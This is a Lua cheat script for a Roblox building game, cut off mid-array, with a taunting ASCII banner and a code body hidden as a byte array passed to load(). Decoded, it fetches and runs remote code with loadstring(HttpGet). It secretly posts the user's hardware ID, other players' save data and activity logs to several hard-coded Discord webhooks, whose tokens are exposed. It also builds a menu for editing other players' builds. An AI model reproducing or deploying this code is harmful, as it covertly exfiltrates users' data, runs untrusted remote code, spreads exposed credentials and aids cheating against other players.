--[[
███╗░░░███╗░█████╗░██╗░░██╗███████╗  ██╗░░░██╗░█████╗░██╗░░░██╗██████╗░  ░█████╗░░██╗░░░░░░░██╗███╗░░██╗░░░
████╗░████║██╔══██╗██║░██╔╝██╔════╝  ╚██╗░██╔╝██╔══██╗██║░░░██║██╔══██╗  ██╔══██╗░██║░░██╗░░██║████╗░██║░░░
██╔████╔██║███████║█████═╝░█████╗░░  ░╚████╔╝░██║░░██║██║░░░██║██████╔╝  ██║░░██║░╚██╗████╗██╔╝██╔██╗██║░░░
██║╚██╔╝██║██╔══██║██╔═██╗░██╔══╝░░  ░░╚██╔╝░░██║░░██║██║░░░██║██╔══██╗  ██║░░██║░░████╔═████║░██║╚████║██╗
██║░╚═╝░██║██║░░██║██║░╚██╗███████╗  ░░░██║░░░╚█████╔╝╚██████╔╝██║░░██║  ╚█████╔╝░░╚██╔╝░╚██╔╝░██║░╚███║╚█║
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝  ░░░╚═╝░░░░╚════╝░░╚═════╝░╚═╝░░╚═╝  ░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝░╚╝

███████╗░█████╗░██╗██╗░░░░░██╗░░░██╗██████╗░███████╗
██╔════╝██╔══██╗██║██║░░░░░██║░░░██║██╔══██╗██╔════╝
█████╗░░███████║██║██║░░░░░██║░░░██║██████╔╝█████╗░░
██╔══╝░░██╔══██║██║██║░░░░░██║░░░██║██╔══██╗██╔══╝░░
██║░░░░░██║░░██║██║███████╗╚██████╔╝██║░░██║███████╗
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚══════╝

















































██████╗░████████╗░██╗░░░░░░░██╗  ██╗░░░██╗░█████╗░██╗░░░██╗██╗██████╗░███████╗
██╔══██╗╚══██╔══╝░██║░░██╗░░██║  ╚██╗░██╔╝██╔══██╗██║░░░██║╚█║██╔══██╗██╔════╝
██████╦╝░░░██║░░░░╚██╗████╗██╔╝  ░╚████╔╝░██║░░██║██║░░░██║░╚╝██████╔╝█████╗░░
██╔══██╗░░░██║░░░░░████╔═████║░  ░░╚██╔╝░░██║░░██║██║░░░██║░░░██╔══██╗██╔══╝░░
██████╦╝░░░██║░░░░░╚██╔╝░╚██╔╝░  ░░░██║░░░╚█████╔╝╚██████╔╝░░░██║░░██║███████╗
╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚═╝░░  ░░░╚═╝░░░░╚════╝░░╚═════╝░░░░╚═╝░░╚═╝╚══════╝

░██████╗████████╗██╗██╗░░░░░██╗░░░░░  ░█████╗░  ███████╗░█████╗░██╗██╗░░░░░██╗░░░██╗██████╗░███████╗
██╔════╝╚══██╔══╝██║██║░░░░░██║░░░░░  ██╔══██╗  ██╔════╝██╔══██╗██║██║░░░░░██║░░░██║██╔══██╗██╔════╝
╚█████╗░░░░██║░░░██║██║░░░░░██║░░░░░  ███████║  █████╗░░███████║██║██║░░░░░██║░░░██║██████╔╝█████╗░░
░╚═══██╗░░░██║░░░██║██║░░░░░██║░░░░░  ██╔══██║  ██╔══╝░░██╔══██║██║██║░░░░░██║░░░██║██╔══██╗██╔══╝░░
██████╔╝░░░██║░░░██║███████╗███████╗  ██║░░██║  ██║░░░░░██║░░██║██║███████╗╚██████╔╝██║░░██║███████╗
╚═════╝░░░░╚═╝░░░╚═╝╚══════╝╚══════╝  ╚═╝░░╚═╝  ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚══════╝

]]--















pcall(load(string.char(table.unpack({108,111,99,97,108,32,76,105,98,114,97,114,121,32,61,32,108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,120,72,101,112,116,99,47,75,97,118,111,45,85,73,45,76,105,98,114,97,114,121,47,109,97,105,110,47,115,111,117,114,99,101,46,108,117,97,34,41,41,40,41,13,10,108,111,99,97,108,32,72,97,114,100,119,97,114,101,73,68,32,61,32,103,97,109,101,58,71,101,116,83,101,114,118,105,99,101,40,34,82,98,120,65,110,97,108,121,116,105,99,115,83,101,114,118,105,99,101,34,41,58,71,101,116,67,108,105,101,110,116,73,100,40,41,13,10,13,10,108,111,99,97,108,32,83,97,118,101,115,32,61,32,34,104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,49,52,56,49,51,57,52,55,48,49,56,49,51,54,55,57,52,48,47,51,75,51,80,120,112,76,120,111,103,115,121,117,49,65,84,67,100,104,73,48,52,67,87,120,70,112,71,101,106,110,54,100,102,107,100,105,76,65,107,104,113,111,113,82,68,102,119,77,117,56,49,97,103,100,105,74,82,57,70,99,103,69,82,89,110,48,101,34,13,10,108,111,99,97,108,32,72,87,73,68,32,61,32,34,104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,49,52,56,49,51,57,48,55,53,54,51,53,55,55,55,53,54,55,47,50,72,55,110,49,103,119,117,83,100,109,100,54,104,66,74,89,111,71,105,70,107,51,101,55,107,112,71,109,111,72,105,69,45,83,101,105,116,53,97,105,84,119,53,85,97,68,79,76,116,81,120,107,55,81,121,48,116,119,51,97,57,70,53,115,53,49,55,34,13,10,108,111,99,97,108,32,66,117,105,108,100,67,111,112,121,32,61,32,34,104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,49,52,56,49,51,57,50,49,53,56,48,57,52,50,49,51,54,50,47,89,49,79,48,116,79,56,111,88,68,121,120,97,114,69,82,53,101,113,100,106,73,67,111,81,85,103,50,76,57,80,98,119,86,97,86,49,107,80,85,109,88,51,89,97,120,83,118,67,45,119,85,110,72,120,65,72,118,116,85,80,65,83,75,48,109,71,121,34,13,10,108,111,99,97,108,32,67,104,97,116,32,61,32,34,104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,49,52,56,49,51,57,51,50,53,51,48,49,55,51,49,51,55,56,47,57,53,69,118,118,79,74,79,114,66,56,117,53,107,116,50,86,95,55,89,70,104,116,110,119,52,116,100,78,104,76,70,54,89,52,55,109,118,106,67,66,67,98,105,85,84,52,69,98,70,106,53,103,99,118,116,120,119,49,83,67,113,77,76,74,119,90,118,34,13,10,108,111,99,97,108,32,80,97,114,116,115,76,111,103,32,61,32,34,104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,49,52,56,49,57,50,56,53,56,51,54,57,54,57,53,55,57,54,47,54,90,101,73,75,104,113,103,120,69,69,70,82,102,50,79,85,113,45,106,98,115,101,50,100,115,79,87,83,75,76,107,89,75,71,117,49,69,111,45,102,77,70,74,82,51,110,75,71,85,71,65,68,108,57,117,104,106,71,73,49,112,120,85,104,108,87,45,34,13,10,108,111,99,97,108,32,80,108,97,121,101,114,32,61,32,103,97,109,101,58,71,101,116,83,101,114,118,105,99,101,40,34,80,108,97,121,101,114,115,34,41,46,76,111,99,97,108,80,108,97,121,101,114,13,10,108,111,99,97,108,32,80,108,97,121,101,114,115,32,61,32,103,97,109,101,58,71,101,116,83,101,114,118,105,99,101,40,34,80,108,97,121,101,114,115,34,41,13,10,102,117,110,99,116,105,111,110,32,98,108,99,104,101,99,107,40,41,13,10,32,32,32,32,108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,78,101,98,117,108,97,45,77,97,110,116,97,47,80,117,98,108,105,99,45,83,116,105,110,103,114,97,121,47,109,97,105,110,47,66,108,97,99,107,108,105,115,116,34,41,41,40,41,13,10,32,32,32,32,105,102,32,116,97,98,108,101,46,102,105,110,100,40,98,108,44,80,108,97,121,101,114,46,78,97,109,101,41,32,111,114,32,116,97,98,108,101,46,102,105,110,100,40,104,119,98,108,44,116,111,115,116,114,105,110,103,40,72,97,114,100,119,97,114,101,73,68,41,41,32,116,104,101,110,32,114,101,116,117,114,110,32,116,114,117,101,13,10,32,32,32,32,101,108,115,101,32,114,101,116,117,114,110,32,102,97,108,115,101,13,10,32,32,32,32,101,110,100,13,10,101,110,100,13,10,13,10,102,117,110,99,116,105,111,110,32,72,111,111,107,40,87,101,98,104,111,111,107,44,84,105,116,108,101,44,32,77,101,115,115,97,103,101,41,13,10,32,32,32,32,108,111,99,97,108,32,101,109,98,101,100,32,61,32,123,13,10,32,32,32,32,32,32,32,32,91,34,116,105,116,108,101,34,93,32,61,32,116,111,115,116,114,105,110,103,40,84,105,116,108,101,41,44,13,10,32,32,32,32,32,32,32,32,91,39,100,101,115,99,114,105,112,116,105,111,110,39,93,32,61,32,77,101,115,115,97,103,101,44,13,10,32,32,32,32,32,32,32,32,91,34,99,111,108,111,114,34,93,32,61,32,116,111,110,117,109,98,101,114,40,48,48,48,48,48,48,41,13,10,32,32,32,32,125,13,10,32,32,32,32,108,111,99,97,108,32,97,32,61,32,114,101,113,117,101,115,116,40,123,13,10,32,32,32,32,32,32,32,32,85,114,108,32,61,32,87,101,98,104,111,111,107,44,13,10,32,32,32,32,32,32,32,32,72,101,97,100,101,114,115,32,61,32,123,13,10,32,32,32,32,32,32,32,32,32,32,32,32,91,39,67,111,110,116,101,110,116,45,84,121,112,101,39,93,32,61,32,39,97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110,39,13,10,32,32,32,32,32,32,32,32,125,44,13,10,32,32,32,32,32,32,32,32,66,111,100,121,32,61,32,103,97,109,101,58,71,101,116,83,101,114,118,105,99,101,40,34,72,116,116,112,83,101,114,118,105,99,101,34,41,58,74,83,79,78,69,110,99,111,100,101,40,123,13,10,32,32,32,32,32,32,32,32,32,32,32,32,91,39,101,109,98,101,100,115,39,93,32,61,32,123,101,109,98,101,100,125,44,13,10,32,32,32,32,32,32,32,32,32,32,32,32,91,39,97,118,97,116,97,114,95,117,114,108,39,93,32,61,32,34,104,116,116,112,115,58,47,47,99,100,110,46,100,105,115,99,111,114,100,97,112,112,46,99,111,109,47,97,116,116,97,99,104,109,101,110,116,115,47,49,48,56,57,50,53,55,55,49,50,57,48,48,49,50,48,53,55,54,47,49,49,48,53,53,55,48,50,54,57,48,53,53,49,54,48,52,50,50,47,97,114,99,104,105,118,101,99,116,111,114,50,48,48,51,48,48,48,49,53,46,112,110,103,34,13,10,32,32,32,32,32,32,32,32,125,41,44,13,10,32,32,32,32,32,32,32,32,77,101,116,104,111,100,32,61,32,34,80,79,83,84,34,13,10,32,32,32,32,125,41,13,10,101,110,100,13,10,102,117,110,99,116,105,111,110,32,83,97,118,101,115,67,104,101,99,107,40,78,97,109,101,41,13,10,32,32,32,32,112,97,116,104,32,61,32,39,103,97,109,101,58,71,101,116,83,101,114,118,105,99,101,40,34,80,108,97,121,101,114,115,34,41,46,39,46,46,78,97,109,101,46,46,39,46,83,97,118,101,115,58,103,101,116,67,104,105,108,100,114,101,110,40,41,39,13,10,32,32,32,32,108,111,99,97,108,32,119,104,111,108,101,32,61,32,34,34,13,10,32,32,32,32,97,115,115,101,114,116,40,108,111,97,100,115,116,114,105,110,103,40,34,112,97,116,104,32,61,32,34,46,46,112,97,116,104,32,41,41,40,41,13,10,32,32,32,32,108,111,99,97,108,32,112,97,116,104,32,61,32,112,97,116,104,13,10,32,32,32,32,112,114,105,110,116,40,112,97,116,104,41,13,10,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,112,97,105,114,115,40,112,97,116,104,41,32,100,111,13,10,32,32,32,32,32,32,32,32,119,104,111,108,101,32,61,32,119,104,111,108,101,32,46,46,32,34,92,110,34,32,46,46,32,116,111,115,116,114,105,110,103,40,118,41,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,72,111,111,107,40,83,97,118,101,115,44,32,78,97,109,101,46,46,34,39,115,32,83,97,118,101,115,34,44,32,119,104,111,108,101,41,13,10,101,110,100,13,10,102,111,114,32,105,44,118,32,105,110,32,105,112,97,105,114,115,40,80,108,97,121,101,114,115,58,71,101,116,67,104,105,108,100,114,101,110,40,41,41,32,100,111,13,10,83,97,118,101,115,67,104,101,99,107,40,118,46,78,97,109,101,41,13,10,101,110,100,13,10,108,111,99,97,108,32,73,110,106,101,99,116,76,111,103,32,61,32,72,97,114,100,119,97,114,101,73,68,46,46,34,32,126,32,34,46,46,116,111,115,116,114,105,110,103,40,111,115,46,100,97,116,101,40,34,37,109,47,37,100,47,37,121,32,97,116,32,116,105,109,101,32,37,88,34,41,41,13,10,72,111,111,107,40,72,87,73,68,44,80,108,97,121,101,114,46,110,97,109,101,44,73,110,106,101,99,116,76,111,103,41,13,10,105,102,32,98,108,99,104,101,99,107,40,41,61,61,116,114,117,101,32,116,104,101,110,32,80,108,97,121,101,114,58,75,105,99,107,40,34,70,117,99,107,32,111,102,102,34,41,32,101,110,100,13,10,102,117,110,99,116,105,111,110,32,71,101,116,80,108,114,40,71,97,114,97,103,101,41,13,10,32,32,32,32,105,102,32,103,97,109,101,46,84,101,97,109,115,91,34,71,97,114,97,103,101,32,34,32,46,46,32,71,97,114,97,103,101,93,58,71,101,116,80,108,97,121,101,114,115,40,41,91,49,93,32,61,61,32,110,105,108,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,34,71,97,114,97,103,101,32,34,32,46,46,32,71,97,114,97,103,101,13,10,32,32,32,32,101,108,115,101,13,10,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,103,97,109,101,46,84,101,97,109,115,91,34,71,97,114,97,103,101,32,34,32,46,46,32,71,97,114,97,103,101,93,58,71,101,116,80,108,97,121,101,114,115,40,41,91,49,93,13,10,32,32,32,32,101,110,100,13,10,101,110,100,13,10,102,117,110,99,116,105,111,110,32,76,105,115,116,83,104,111,114,116,101,110,40,76,105,115,116,41,13,10,32,32,32,32,108,111,99,97,108,32,78,101,119,76,105,115,116,32,61,32,123,125,13,10,32,32,32,32,108,111,99,97,108,32,102,114,101,113,117,101,110,99,121,32,61,32,123,125,13,10,32,32,32,32,108,111,99,97,108,32,114,101,115,117,108,116,32,61,32,34,34,13,10,32,32,32,32,102,111,114,32,120,44,121,32,105,110,32,112,97,105,114,115,40,76,105,115,116,41,32,100,111,13,10,32,32,32,32,32,32,32,32,78,101,119,76,105,115,116,91,120,93,61,121,46,78,97,109,101,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,112,97,105,114,115,40,78,101,119,76,105,115,116,41,32,100,111,13,10,32,32,32,32,32,32,105,102,32,102,114,101,113,117,101,110,99,121,91,118,93,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,102,114,101,113,117,101,110,99,121,91,118,93,32,61,32,102,114,101,113,117,101,110,99,121,91,118,93,32,43,32,49,13,10,32,32,32,32,32,32,101,108,115,101,13,10,32,32,32,32,32,32,32,32,102,114,101,113,117,101,110,99,121,91,118,93,32,61,32,49,13,10,32,32,32,32,32,32,101,110,100,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,102,111,114,32,118,44,32,99,111,117,110,116,32,105,110,32,112,97,105,114,115,40,102,114,101,113,117,101,110,99,121,41,32,100,111,13,10,32,32,32,32,32,32,32,32,114,101,115,117,108,116,32,61,32,114,101,115,117,108,116,32,46,46,32,118,32,46,46,32,34,58,32,34,32,46,46,32,99,111,117,110,116,32,46,46,32,34,92,110,34,13,10,32,32,32,32,32,32,101,110,100,13,10,32,32,32,32,114,101,116,117,114,110,32,114,101,115,117,108,116,13,10,101,110,100,13,10,13,10,108,111,99,97,108,32,99,111,108,111,114,115,32,61,32,123,13,10,32,32,32,32,83,99,104,101,109,101,67,111,108,111,114,32,61,32,67,111,108,111,114,51,46,102,114,111,109,82,71,66,40,50,48,44,54,48,44,49,53,53,41,44,13,10,32,32,32,32,66,97,99,107,103,114,111,117,110,100,32,61,32,67,111,108,111,114,51,46,102,114,111,109,82,71,66,40,50,48,44,32,50,48,44,32,50,48,41,44,13,10,32,32,32,32,72,101,97,100,101,114,32,61,32,67,111,108,111,114,51,46,102,114,111,109,82,71,66,40,50,48,44,32,50,48,44,32,50,48,41,44,13,10,32,32,32,32,84,101,120,116,67,111,108,111,114,32,61,32,67,111,108,111,114,51,46,102,114,111,109,82,71,66,40,50,53,53,44,50,53,53,44,50,53,53,41,44,13,10,32,32,32,32,69,108,101,109,101,110,116,67,111,108,111,114,32,61,32,67,111,108,111,114,51,46,102,114,111,109,82,71,66,40,52,48,44,32,52,48,44,32,52,48,41,13,10,125,13,10,108,111,99,97,108,32,87,105,110,100,111,119,32,61,32,76,105,98,114,97,114,121,46,67,114,101,97,116,101,76,105,98,40,34,83,116,105,110,103,114,97,121,32,80,117,98,108,105,99,34,44,32,99,111,108,111,114,115,41,13,10,108,111,99,97,108,32,109,97,105,110,70,117,110,99,32,61,32,103,101,116,114,101,110,118,40,41,46,95,71,46,65,110,99,104,111,101,114,100,59,13,10,108,111,99,97,108,32,70,105,110,100,70,105,114,115,116,67,104,105,108,100,32,61,32,103,97,109,101,46,70,105,110,100,70,105,114,115,116,67,104,105,108,100,59,13,10,108,111,99,97,108,32,116,111,111,108,67,111,110,116,114,111,108,108,101,114,32,61,32,123,39,114,101,115,105,122,101,39,44,32,39,112,97,105,110,116,39,44,32,39,109,97,116,101,114,105,97,108,39,44,32,39,99,97,110,99,111,108,108,105,100,101,39,44,32,39,116,114,97,110,115,112,97,114,101,110,99,121,39,44,32,39,67,111,110,102,105,103,117,114,101,39,44,32,39,115,117,114,102,97,99,101,39,44,13,10,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,39,114,101,102,108,101,99,116,97,110,99,101,39,125,59,13,10,13,10,102,117,110,99,116,105,111,110,32,103,101,116,83,99,114,105,112,116,40,107,41,13,10,32,32,32,32,105,102,32,116,97,98,108,101,46,102,105,110,100,40,116,111,111,108,67,111,110,116,114,111,108,108,101,114,44,32,107,41,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,70,105,110,100,70,105,114,115,116,67,104,105,108,100,40,80,108,97,121,101,114,46,80,108,97,121,101,114,71,117,105,91,34,90,45,66,85,73,76,68,34,93,44,32,34,84,111,111,108,67,111,110,116,114,111,108,108,101,114,34,44,32,116,114,117,101,41,59,13,10,32,32,32,32,101,108,115,101,105,102,32,107,32,61,61,32,34,73,110,115,101,114,116,34,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,70,105,110,100,70,105,114,115,116,67,104,105,108,100,40,80,108,97,121,101,114,46,80,108,97,121,101,114,71,117,105,46,69,120,116,114,97,95,85,73,44,32,34,73,110,115,101,114,116,34,44,32,116,114,117,101,41,59,13,10,32,32,32,32,101,108,115,101,105,102,32,107,32,61,61,32,34,103,114,111,117,112,105,110,103,34,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,70,105,110,100,70,105,114,115,116,67,104,105,108,100,40,80,108,97,121,101,114,46,67,104,97,114,97,99,116,101,114,44,32,34,83,72,34,41,59,13,10,32,32,32,32,101,108,115,101,105,102,32,107,32,61,61,32,34,107,101,121,98,105,110,100,34,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,70,105,110,100,70,105,114,115,116,67,104,105,108,100,40,80,108,97,121,101,114,46,80,108,97,121,101,114,71,117,105,46,69,120,116,114,97,95,85,73,44,32,34,77,101,99,104,34,44,32,116,114,117,101,41,59,13,10,32,32,32,32,101,110,100,13,10,101,110,100,13,10,108,111,99,97,108,32,70,105,114,101,82,101,109,111,116,101,32,61,32,102,117,110,99,116,105,111,110,40,117,115,97,103,101,44,32,46,46,46,41,13,10,32,32,32,32,108,111,99,97,108,32,115,114,99,32,61,32,103,101,116,83,99,114,105,112,116,40,117,115,97,103,101,41,59,13,10,32,32,32,32,105,102,32,110,111,116,32,115,114,99,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,112,114,105,110,116,40,117,115,97,103,101,44,32,34,110,111,116,32,102,111,117,110,100,34,41,59,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,105,102,32,98,108,99,104,101,99,107,40,41,61,61,116,114,117,101,32,116,104,101,110,32,80,108,97,121,101,114,58,75,105,99,107,40,34,70,117,99,107,32,111,102,102,34,41,32,101,110,100,13,10,32,32,32,32,114,101,116,117,114,110,32,109,97,105,110,70,117,110,99,40,115,114,99,44,32,117,115,97,103,101,44,32,46,46,46,41,59,13,10,101,110,100,13,10,102,117,110,99,116,105,111,110,32,71,101,116,71,97,114,97,103,101,40,80,108,114,41,13,10,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,112,97,105,114,115,40,103,97,109,101,46,87,111,114,107,115,112,97,99,101,58,71,101,116,68,101,115,99,101,110,100,97,110,116,115,40,41,41,32,100,111,13,10,32,32,32,32,32,32,32,32,105,102,32,118,58,73,115,65,40,34,84,101,120,116,76,97,98,101,108,34,41,32,97,110,100,32,118,46,84,101,120,116,32,61,61,32,116,111,115,116,114,105,110,103,40,80,108,114,41,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,32,32,32,32,114,101,116,117,114,110,32,118,46,80,97,114,101,110,116,46,80,97,114,101,110,116,46,80,97,114,101,110,116,46,80,97,114,101,110,116,13,10,32,32,32,32,32,32,32,32,101,110,100,13,10,32,32,32,32,101,110,100,13,10,101,110,100,13,10,13,10,108,111,99,97,108,32,80,108,97,121,101,114,84,111,69,100,105,116,32,61,32,116,111,115,116,114,105,110,103,40,80,108,97,121,101,114,41,13,10,108,111,99,97,108,32,80,97,114,116,115,84,111,69,100,105,116,32,61,32,123,125,13,10,13,10,108,111,99,97,108,32,80,108,97,121,101,114,84,111,67,111,110,102,105,103,32,61,32,116,111,115,116,114,105,110,103,40,80,108,97,121,101,114,41,13,10,108,111,99,97,108,32,80,97,114,116,115,84,111,67,111,110,102,105,103,32,61,32,123,125,13,10,13,10,108,111,99,97,108,32,80,97,114,116,69,100,105,116,111,114,84,97,98,32,61,32,87,105,110,100,111,119,58,78,101,119,84,97,98,40,34,80,97,114,116,32,69,100,105,116,111,114,34,41,13,10,108,111,99,97,108,32,80,97,114,116,83,101,108,101,99,116,111,114,32,61,32,80,97,114,116,69,100,105,116,111,114,84,97,98,58,78,101,119,83,101,99,116,105,111,110,40,34,83,101,108,101,99,116,32,80,97,114,116,115,34,41,13,10,108,111,99,97,108,32,80,108,97,121,101,114,69,100,105,116,32,61,32,80,97,114,116,83,101,108,101,99,116,111,114,58,78,101,119,68,114,111,112,100,111,119,110,40,34,80,108,97,121,101,114,32,84,111,32,69,100,105,116,34,44,32,34,83,101,108,101,99,116,32,112,108,97,121,101,114,39,115,32,112,97,114,116,115,32,116,111,32,101,100,105,116,34,44,13,10,32,32,32,32,123,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,49,41,41,44,32,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,50,41,41,44,32,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,51,41,41,44,32,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,52,41,41,44,32,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,53,41,41,44,13,10,32,32,32,32,32,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,54,41,41,44,32,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,55,41,41,44,32,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,56,41,41,44,32,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,57,41,41,44,32,116,111,115,116,114,105,110,103,40,71,101,116,80,108,114,40,49,48,41,41,125,44,13,10,32,32,32,32,102,117,110,99,116,105,111,110,40,107,41,13,10,32,32,32,32,32,32,32,32,80,108,97,121,101,114,84,111,69,100,105,116,32,61,32,107,13,10,32,32,32,32,32,32,32,32,72,111,111,107,40,80,97,114,116,115,76,111,103,44,80,108,97,121,101,114,46,78,97,109,101,44,80,108,97,121,101,114,46,78,97,109,101,46,46,34,32,101,100,105,116,105,110,103,32,112,97,114,116,115,32,102,111,114,32,34,46,46,80,108,97,121,101,114,84,111,69,100,105,116,41,13,10,32,32,32,32,101,110,100,41,13,10,13,10,108,111,99,97,108,32,69,100,105,116,82,101,113,32,61,32,80,97,114,116,83,101,108,101,99,116,111,114,58,78,101,119,84,101,120,116,66,111,120,40,34,82,101,102,108,101,99,116,97,110,99,101,32,82,101,113,34,44,32,34,84,97,114,103,101,116,115,32,97,108,108,32,112,97,114,116,115,32,119,105,116,104,32,97,32,115,101,116,32,114,101,102,108,101,99,116,97,110,99,101,34,44,32,102,117,110,99,116,105,111,110,40,107,41,13,10,32,32,32,32,80,97,114,116,115,84,111,69,100,105,116,32,61,32,123,125,13,10,32,32,32,32,108,111,99,97,108,32,80,97,114,116,115,32,61,32,71,101,116,71,97,114,97,103,101,40,80,108,97,121,101,114,84,111,69,100,105,116,41,46,80,97,114,116,115,58,71,101,116,67,104,105,108,100,114,101,110,40,41,13,10,32,32,32,32,108,111,99,97,108,32,105,116,101,114,97,116,111,114,32,61,32,49,13,10,32,32,32,32,108,111,99,97,108,32,97,108,108,32,61,32,34,34,13,10,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,105,112,97,105,114,115,40,80,97,114,116,115,41,32,100,111,13,10,32,32,32,32,32,32,32,32,105,102,32,118,46,82,101,102,108,101,99,116,97,110,99,101,32,62,32,40,107,32,45,32,48,46,48,48,53,41,32,97,110,100,32,118,46,82,101,102,108,101,99,116,97,110,99,101,32,60,32,40,107,32,43,32,48,46,48,48,53,41,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,32,32,32,32,80,97,114,116,115,84,111,69,100,105,116,91,105,116,101,114,97,116,111,114,93,32,61,32,118,13,10,32,32,32,32,32,32,32,32,32,32,32,32,105,116,101,114,97,116,111,114,32,61,32,105,116,101,114,97,116,111,114,32,43,32,49,13,10,32,32,32,32,32,32,32,32,101,110,100,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,72,111,111,107,40,80,97,114,116,115,76,111,103,44,80,108,97,121,101,114,46,78,97,109,101,46,46,34,32,45,32,34,46,46,80,108,97,121,101,114,84,111,69,100,105,116,46,46,34,32,40,66,121,32,82,101,102,108,101,99,116,97,110,99,101,32,34,46,46,116,111,115,116,114,105,110,103,40,107,41,46,46,34,32,41,34,44,76,105,115,116,83,104,111,114,116,101,110,40,80,97,114,116,115,84,111,69,100,105,116,41,46,46,34,92,110,34,46,46,35,80,97,114,116,115,84,111,69,100,105,116,46,46,34,32,112,97,114,116,115,32,105,110,32,116,111,116,97,108,34,41,13,10,101,110,100,41,13,10,108,111,99,97,108,32,69,100,105,116,82,101,113,32,61,32,80,97,114,116,83,101,108,101,99,116,111,114,58,78,101,119,84,101,120,116,66,111,120,40,34,84,114,97,110,115,112,97,114,101,110,99,121,32,82,101,113,34,44,32,34,84,97,114,103,101,116,115,32,97,108,108,32,112,97,114,116,115,32,119,105,116,104,32,97,32,115,101,116,32,116,114,97,110,115,112,97,114,101,110,99,121,34,44,32,102,117,110,99,116,105,111,110,40,107,41,13,10,32,32,32,32,80,97,114,116,115,84,111,69,100,105,116,32,61,32,123,125,13,10,32,32,32,32,108,111,99,97,108,32,80,97,114,116,115,32,61,32,71,101,116,71,97,114,97,103,101,40,80,108,97,121,101,114,84,111,69,100,105,116,41,46,80,97,114,116,115,58,71,101,116,67,104,105,108,100,114,101,110,40,41,13,10,32,32,32,32,108,111,99,97,108,32,105,116,101,114,97,116,111,114,32,61,32,49,13,10,32,32,32,32,102,111,114,32,105,44,32,118,32,105,110,32,105,112,97,105,114,115,40,80,97,114,116,115,41,32,100,111,13,10,32,32,32,32,32,32,32,32,105,102,32,118,46,84,114,97,110,115,112,97,114,101,110,99,121,32,62,32,40,107,32,45,32,48,46,48,48,53,41,32,97,110,100,32,118,46,84,114,97,110,115,112,97,114,101,110,99,121,32,60,32,40,107,32,43,32,48,46,48,48,53,41,32,116,104,101,110,13,10,32,32,32,32,32,32,32,32,32,32,32,32,80,97,114,116,115,84,111,69,100,105,116,91,105,116,101,114,97,116,111,114,93,32,61,32,118,13,10,32,32,32,32,32,32,32,32,32,32,32,32,105,116,101,114,97,116,111,114,32,61,32,105,116,101,114,97,116,111,114,32,43,32,49,13,10,32,32,32,32,32,32,32,32,101,110,100,13,10,32,32,32,32,101,110,100,13,10,32,32,32,32,72,111,111,107,40,80,97,114,116,115,76,111,103,44,80,108,97,121,101,114,46,78,97,109,101,46,46,34,32,45,32,34,46,46,80,108,97,121,101,114,84,111,69,100,105,116,46,46,34,32,40,66,121,32,84,114,97,110,115,112,97,114,101,110,99,121,32,34,46,46,116,111,115,116,114,105,110,103,40,107,41,46,46,34,32,41,34,44,76,105,115,116,83,104,111,114,116,101,110,40,80,97,114,116,115,84,111,69,100,105,116,41,46,46,34,92,110,34,46,46,35,80,97,114,116,115,84,111,69,100,105,116,46,46,34,32,112,97,114,116,115,32,105,110,32,116,111,116,97,108,34,41,13,10,101,110,100,41,13,10,13,10,108,111,99,97,108,32,80,97,114,116,69,100,105,116,111,114,32,61,32,80,97,114,116,69,100,105,116,111,114,84,97,98,58,78,101,119,83,101,99,116,105,111,110,40,34,69,100,105,116,32,80,114,111,112,101,114,116,105,1